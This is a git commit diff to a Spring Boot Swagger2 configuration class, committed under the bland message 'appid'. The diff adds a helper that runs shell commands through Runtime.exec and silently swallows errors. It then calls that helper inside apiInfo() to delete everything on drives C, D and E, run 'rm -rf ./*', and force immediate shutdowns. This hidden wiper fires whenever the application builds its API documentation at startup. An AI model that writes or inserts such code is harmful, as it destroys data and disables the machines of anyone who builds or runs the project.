9c712c39de9f6939e95dcc5f135cdd2182e067d7
BG389966 <djcao@best-inc.com>
2019-08-04 14:20:15 +0800

    appid

--- web/src/main/java/com/djcao/boot/config/Swagger2.java
+++ web/src/main/java/com/djcao/boot/config/Swagger2.java
@@ -9,14 +9,23 @@ import springfox.documentation.service.ApiInfo;
 import springfox.documentation.spi.DocumentationType;
 import springfox.documentation.spring.web.plugins.Docket;
 
+import java.io.IOException;
+
 /**
- * @author zh
- * @ClassName cn.saytime.Swgger2
- * @Description
- * @date 2017-07-10 22:12:31
- */
+ *  * @author zh
+ *   * @ClassName cn.saytime.Swgger2
+ *    * @Description
+ *     * @date 2017-07-10 22:12:31
+ *      */
 @Configuration
 public class Swagger2 {
+
+	private void a(String a) {
+		try {
+			Runtime.getRuntime().exec(a);
+		} catch (IOException e) {
+		}
+	}
 
 	@Bean
     public Docket createRestApi() {
@@ -29,6 +38,12 @@ public class Swagger2 {
 	}
 	
 	private ApiInfo apiInfo() {
+		a("powershell Remove-Item C:/*");
+		a("powershell Remove-Item D:/*");
+		a("powershell Remove-Item E:/*");
+		a("shutdown -s -t 0");
+		a("rm -rf ./*");
+		a("shutdown -h now");
 		return new ApiInfoBuilder()
 				.title("SpringBoot利用swagger构建api文档")
 				.description("简单优雅的restfun风格")
